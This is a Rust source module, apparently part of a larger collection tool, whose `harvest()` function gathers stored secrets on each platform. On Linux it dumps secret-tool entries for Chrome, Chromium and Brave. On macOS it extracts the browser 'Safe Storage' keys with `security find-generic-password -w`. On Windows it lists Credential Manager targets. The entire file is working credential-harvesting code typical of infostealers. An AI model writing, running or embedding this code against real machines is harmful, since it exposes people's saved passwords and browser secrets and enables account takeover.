//! Best-effort keyring and stored-credential collection.
//!
//! Linux uses `secret-tool`, macOS asks `security` for known services, Windows
//! lists Credential Manager targets with `cmdkey`. Output is captured as text;
//! Windows targets do not expose plaintext without a helper.

use serde::Serialize;

use crate::run;

/// One keyring block.
#[derive(Debug, Clone, Serialize)]
pub struct Entry {
    /// Source command or service.
    pub source: String,
    /// Captured text.
    pub text: String,
}

/// Keyring result.
#[derive(Debug, Default, Serialize)]
pub struct Report {
    /// Captured entries.
    pub entries: Vec<Entry>,
    /// Non-fatal problems.
    pub warnings: Vec<String>,
}

/// Collects whatever the platform exposes.
pub fn harvest() -> Report {
    let mut report = Report::default();
    #[cfg(target_os = "linux")]
    {
        for attributes in [
            ["search", "--all", "application", "chrome"],
            ["search", "--all", "application", "chromium"],
            ["search", "--all", "application", "brave"],
            [
                "search",
                "--all",
                "xdg:schema",
                "org.freedesktop.Secret.Generic",
            ],
        ] {
            let label = attributes.join(" ");
            if let Some(text) = run("secret-tool", &attributes) {
                if !text.trim().is_empty() {
                    report.entries.push(Entry {
                        source: label,
                        text,
                    });
                }
            }
        }
        if report.entries.is_empty() {
            report
                .warnings
                .push("secret-tool returned no entries".into());
        }
    }
    #[cfg(target_os = "macos")]
    {
        for service in [
            "Chrome Safe Storage",
            "Brave Safe Storage",
            "Microsoft Edge Safe Storage",
            "Chromium Safe Storage",
        ] {
            if let Some(text) = run("security", &["find-generic-password", "-w", "-s", service]) {
                report.entries.push(Entry {
                    source: service.into(),
                    text,
                });
            }
        }
    }
    #[cfg(windows)]
    {
        if let Some(text) = run("cmdkey", &["/list"]) {
            report.entries.push(Entry {
                source: "cmdkey /list".into(),
                text,
            });
        } else {
            report.warnings.push("cmdkey produced no output".into());
        }
    }
    report
}
